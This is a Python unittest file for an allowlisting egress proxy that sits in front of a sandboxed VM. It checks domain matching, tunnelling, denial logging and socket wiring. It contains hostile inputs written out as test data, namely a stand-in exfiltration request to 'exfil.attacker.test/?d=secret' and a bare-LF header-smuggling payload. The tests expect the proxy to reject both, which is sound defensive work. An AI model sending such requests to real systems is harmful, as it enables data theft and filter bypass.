"""vm_egress_proxy のテスト。

実行: python3 -m unittest vm_egress_proxy_test（tests/vm-egress-proxy.test.sh から呼ぶ）

外には繋がない。Handler は socketpair の片側で動かし、上流への接続（server.connect）は
StubUpstream（socketpair のもう片側を受け、届いたバイト列を記録して決めた応答を返す）に差し替える。
"""

import errno
import io
import json
import os
import re
import shutil
import socket
import tempfile
import threading
import unittest
from contextlib import redirect_stderr
from types import SimpleNamespace

import vm_egress_proxy

REPO_ROOT = os.path.abspath(
    os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "..", "..", "..")
)
ALLOWLIST = ["registry.npmjs.org", "*.npmjs.org", "ports.ubuntu.com", "*.example.com"]


def socket_tempdir(prefix):
    # Claude の sandbox は $TMPDIR/sock の下でだけ Unix socket の bind / connect を許す
    # （claude-code/settings.json の allowUnixSockets）。sandbox 外では普通の一時ディレクトリになる
    parent = os.path.join(tempfile.gettempdir(), "sock")
    os.makedirs(parent, exist_ok=True)
    return tempfile.mkdtemp(prefix=prefix, dir=parent)


def read_all(sock):
    sock.settimeout(60)
    chunks = []
    while True:
        chunk = sock.recv(65536)
        if not chunk:
            return b"".join(chunks)
        chunks.append(chunk)


def status_of(raw):
    return int(raw.split(b"\r\n", 1)[0].split()[1])


class StubUpstream:
    """server.connect の代わり。呼ばれた (host, port) と、届いたバイト列を記録して response を返す。"""

    def __init__(self, response=b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok"):
        self.response = response
        self.calls = []
        self.received = b""
        self.threads = []

    def connect(self, host, port):
        self.calls.append((host, port))
        ours, theirs = socket.socketpair()

        def serve():
            self.received = read_all(theirs)
            theirs.sendall(self.response)
            theirs.close()

        thread = threading.Thread(target=serve)
        thread.start()
        self.threads.append(thread)
        return ours

    def join(self):
        for thread in self.threads:
            thread.join(timeout=60)


class ProxyTestCase(unittest.TestCase):
    def setUp(self):
        self.stderr = io.StringIO()
        redirect = redirect_stderr(self.stderr)
        redirect.__enter__()
        self.addCleanup(redirect.__exit__, None, None, None)
        self.upstream = StubUpstream()

    def exchange(self, raw):
        """socketpair の片側で Handler を動かし、もう片側から生のリクエストを流して応答を全部読む。"""
        client, server_side = socket.socketpair()
        server = SimpleNamespace(allowlist=ALLOWLIST, connect=self.upstream.connect)

        def run():
            vm_egress_proxy.Handler(server_side, "", server)
            server_side.close()

        thread = threading.Thread(target=run)
        thread.start()
        client.sendall(raw)
        # トンネルは client が書き終えたことを上流に伝えて閉じさせる。拒否（403）は Handler が先に
        # 応答して閉じることがあり、そのとき macOS は ENOTCONN を返す（応答は読める）
        try:
            client.shutdown(socket.SHUT_WR)
        except OSError as e:
            if e.errno != errno.ENOTCONN:
                raise
        response = read_all(client)
        client.close()
        thread.join(timeout=60)
        self.upstream.join()
        return response


class MatchTest(unittest.TestCase):
    """一致の仕方は sandbox の allowedDomains と同じ。"""

    def test_exact_entries_match_only_the_same_host(self):
        self.assertTrue(vm_egress_proxy.allowed("registry.npmjs.org", ALLOWLIST))
        self.assertTrue(vm_egress_proxy.allowed("ports.ubuntu.com", ALLOWLIST))
        self.assertFalse(vm_egress_proxy.allowed("x.ports.ubuntu.com", ALLOWLIST))
        self.assertFalse(vm_egress_proxy.allowed("ubuntu.com", ALLOWLIST))
        self.assertFalse(vm_egress_proxy.allowed("ports.ubuntu.com.evil", ALLOWLIST))

    def test_wildcard_matches_subdomains_at_any_depth_but_not_the_apex(self):
        self.assertTrue(vm_egress_proxy.allowed("www.npmjs.org", ALLOWLIST))
        self.assertTrue(vm_egress_proxy.allowed("a.b.npmjs.org", ALLOWLIST))
        self.assertFalse(vm_egress_proxy.allowed("npmjs.org", ALLOWLIST))
        self.assertFalse(vm_egress_proxy.allowed("evilnpmjs.org", ALLOWLIST))
        self.assertFalse(vm_egress_proxy.allowed("npmjs.org.evil.com", ALLOWLIST))
        self.assertFalse(vm_egress_proxy.allowed("example.com", ALLOWLIST))

    def test_case_is_ignored(self):
        self.assertTrue(vm_egress_proxy.allowed("Registry.NPMJS.org", ALLOWLIST))
        self.assertTrue(vm_egress_proxy.allowed("WWW.Example.COM", ALLOWLIST))

    def test_ip_literals_do_not_match_host_patterns(self):
        self.assertFalse(vm_egress_proxy.allowed("93.184.215.14", ALLOWLIST))
        self.assertFalse(vm_egress_proxy.allowed("::1", ALLOWLIST))

    def test_load_allowlist_skips_blank_and_comment_lines(self):
        root = tempfile.mkdtemp(prefix="vep-")
        self.addCleanup(shutil.rmtree, root, ignore_errors=True)
        path = os.path.join(root, "allowlist")
        with open(path, "w") as f:
            f.write("# comment\n\nGitHub.com\n  *.npmjs.org  \n")
        self.assertEqual(
            vm_egress_proxy.load_allowlist(path), ["github.com", "*.npmjs.org"]
        )


class ConnectTest(ProxyTestCase):
    def test_connect_to_an_allowed_host_is_tunneled(self):
        self.upstream.response = b"from-upstream"
        response = self.exchange(
            b"CONNECT registry.npmjs.org:443 HTTP/1.1\r\n"
            b"Host: registry.npmjs.org:443\r\n\r\nfrom-client"
        )
        head, _, body = response.partition(b"\r\n\r\n")
        self.assertEqual(head, b"HTTP/1.1 200 Connection established")
        self.assertEqual(body, b"from-upstream")
        self.assertEqual(self.upstream.calls, [("registry.npmjs.org", 443)])
        self.assertEqual(self.upstream.received, b"from-client")

    def test_connect_to_a_wildcard_subdomain_is_tunneled(self):
        response = self.exchange(b"CONNECT a.b.npmjs.org:8443 HTTP/1.1\r\n\r\n")
        self.assertEqual(status_of(response), 200)
        self.assertEqual(self.upstream.calls, [("a.b.npmjs.org", 8443)])

    def test_connect_outside_the_allowlist_is_403_logged_and_not_contacted(self):
        for target in (
            "example.com:443",
            "npmjs.org:443",
            "evilnpmjs.org:443",
            "93.184.215.14:443",
            "[2606:4700:4700::1111]:443",
        ):
            with self.subTest(target=target):
                response = self.exchange(
                    f"CONNECT {target} HTTP/1.1\r\nHost: {target}\r\n\r\n".encode()
                )
                self.assertEqual(status_of(response), 403)
                host = target.rpartition(":")[0].strip("[]")
                self.assertIn(f"{host} is not in the allowlist".encode(), response)
                self.assertRegex(
                    self.stderr.getvalue(),
                    re.escape(f"vm-egress-proxy: denied CONNECT {host}:443"),
                )
        self.assertEqual(self.upstream.calls, [])


class HttpTest(ProxyTestCase):
    def test_absolute_uri_to_an_allowed_host_is_relayed_in_origin_form(self):
        response = self.exchange(
            b"GET http://ports.ubuntu.com/ubuntu-ports/dists/resolute/InRelease?x=1 HTTP/1.1\r\n"
            b"Host: evil.example.org\r\n"
            b"Proxy-Connection: keep-alive\r\n"
            b"Proxy-Authorization: Basic Zm9vOmJhcg==\r\n"
            b"User-Agent: Debian APT-HTTP/1.3\r\n\r\n"
        )
        self.assertEqual(response, self.upstream.response)
        self.assertEqual(self.upstream.calls, [("ports.ubuntu.com", 80)])
        self.assertEqual(
            self.upstream.received,
            b"GET /ubuntu-ports/dists/resolute/InRelease?x=1 HTTP/1.1\r\n"
            b"Host: ports.ubuntu.com\r\n"
            b"User-Agent: Debian APT-HTTP/1.3\r\n"
            b"Connection: close\r\n\r\n",
        )

    def test_request_body_and_explicit_port_are_passed_through(self):
        self.exchange(
            b"POST http://www.example.com:8080/upload HTTP/1.1\r\n"
            b"Content-Length: 5\r\n\r\nhello"
        )
        self.assertEqual(self.upstream.calls, [("www.example.com", 8080)])
        self.assertEqual(
            self.upstream.received,
            b"POST /upload HTTP/1.1\r\nHost: www.example.com:8080\r\n"
            b"Content-Length: 5\r\nConnection: close\r\n\r\nhello",
        )

    def test_absolute_uri_outside_the_allowlist_is_403_logged_and_not_contacted(self):
        response = self.exchange(
            b"GET http://exfil.attacker.test/?d=secret HTTP/1.1\r\n"
            b"Host: registry.npmjs.org\r\n\r\n"
        )
        self.assertEqual(status_of(response), 403)
        self.assertIn(
            "vm-egress-proxy: denied GET exfil.attacker.test:80", self.stderr.getvalue()
        )
        self.assertEqual(self.upstream.calls, [])

    def test_origin_form_and_https_uris_are_400(self):
        for line in (
            b"GET / HTTP/1.1",
            b"GET https://registry.npmjs.org/ HTTP/1.1",
            b"GET http://user@registry.npmjs.org/ HTTP/1.1",
            b"CONNECT registry.npmjs.org HTTP/1.1",
            b"CONNECT registry.npmjs.org:0 HTTP/1.1",
        ):
            with self.subTest(line=line):
                response = self.exchange(line + b"\r\nHost: registry.npmjs.org\r\n\r\n")
                self.assertEqual(status_of(response), 400)
        self.assertEqual(self.upstream.calls, [])

    def test_header_smuggling_with_bare_line_feeds_is_rejected(self):
        response = self.exchange(
            b"GET http://ports.ubuntu.com/ HTTP/1.1\r\nX: a\nHost: evil.test\r\n\r\n"
        )
        self.assertEqual(status_of(response), 400)
        self.assertEqual(self.upstream.calls, [])


class ConnectUpstreamTest(unittest.TestCase):
    def test_hosts_resolving_to_non_global_addresses_are_403(self):
        # 許可リストに入っていても、名前の先が Mac 自身・LAN なら繋がない
        with self.assertRaises(vm_egress_proxy.Rejected) as caught:
            vm_egress_proxy.connect_upstream("localhost", 80)
        self.assertEqual(caught.exception.status, 403)
        with self.assertRaises(vm_egress_proxy.Rejected) as caught:
            vm_egress_proxy.connect_upstream("192.168.5.2", 3128)
        self.assertEqual(caught.exception.status, 403)


class ServerTest(unittest.TestCase):
    def setUp(self):
        self.stderr = io.StringIO()
        redirect = redirect_stderr(self.stderr)
        redirect.__enter__()
        self.addCleanup(redirect.__exit__, None, None, None)

    def test_listens_on_a_private_socket_and_denies_unlisted_hosts(self):
        root = socket_tempdir("vep-")
        self.addCleanup(shutil.rmtree, root, ignore_errors=True)
        socket_path = os.path.join(root, "state", "proxy.sock")
        vm_egress_proxy.prepare_socket_path(socket_path)
        server = vm_egress_proxy.Server(socket_path, vm_egress_proxy.Handler)
        server.allowlist = ALLOWLIST
        upstream = StubUpstream()
        server.connect = upstream.connect
        threading.Thread(target=server.serve_forever, args=(0.05,), daemon=True).start()
        self.addCleanup(server.server_close)
        self.addCleanup(server.shutdown)
        self.assertEqual(os.stat(os.path.dirname(socket_path)).st_mode & 0o777, 0o700)

        with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as client:
            client.connect(socket_path)
            client.sendall(b"CONNECT example.com:443 HTTP/1.1\r\n\r\n")
            self.assertEqual(status_of(read_all(client)), 403)
        self.assertEqual(upstream.calls, [])
        self.assertIn("denied CONNECT example.com:443", self.stderr.getvalue())

    def test_socket_path_defaults_to_the_state_dir(self):
        home = os.path.expanduser("~")
        self.assertEqual(
            vm_egress_proxy.socket_path({}),
            f"{home}/.local/state/vm-egress-proxy/proxy.sock",
        )
        self.assertEqual(
            vm_egress_proxy.socket_path({"VM_EGRESS_PROXY_SOCKET": "/s/p.sock"}),
            "/s/p.sock",
        )


class WiringTest(unittest.TestCase):
    """ソケットのパスが Lima の forwarder・launchd agent で揃い、sandbox からは届かないか。"""

    SOCKET = "/.local/state/vm-egress-proxy/proxy.sock"

    @classmethod
    def setUpClass(cls):
        with open(os.path.join(REPO_ROOT, "claude-code", "settings.json")) as f:
            cls.sockets = json.load(f)["sandbox"]["network"]["allowUnixSockets"]
        programs = os.path.join(REPO_ROOT, "home-manager", "programs")
        with open(os.path.join(programs, "vm-egress-proxy.nix")) as f:
            cls.nix = f.read()
        with open(os.path.join(programs, "default.nix")) as f:
            cls.imports = f.read()
        with open(os.path.join(REPO_ROOT, "lib", "lima-sandbox", "deny.go")) as f:
            cls.deny_go = f.read()

    def test_proxy_socket_is_not_reachable_from_the_sandbox(self):
        # allowUnixSockets のディレクトリ指定は配下のソケットにも効く（RULES.md の経緯メモ）
        path = "~" + self.SOCKET
        for entry in self.sockets:
            self.assertFalse(
                path == entry or path.startswith(entry.rstrip("/") + "/"), entry
            )
        self.assertEqual(vm_egress_proxy.DEFAULT_SOCKET, path)

    def test_launchd_agent_and_lima_forwarder_use_the_same_socket(self):
        self.assertIn("./vm-egress-proxy.nix", self.imports)
        self.assertIn(f'socket = "${{home}}{self.SOCKET}";', self.nix)
        self.assertIn("VM_EGRESS_PROXY_SOCKET = socket;", self.nix)
        self.assertIn(f'filepath.Join(home, "{self.SOCKET.lstrip("/")}")', self.deny_go)


if __name__ == "__main__":
    unittest.main()
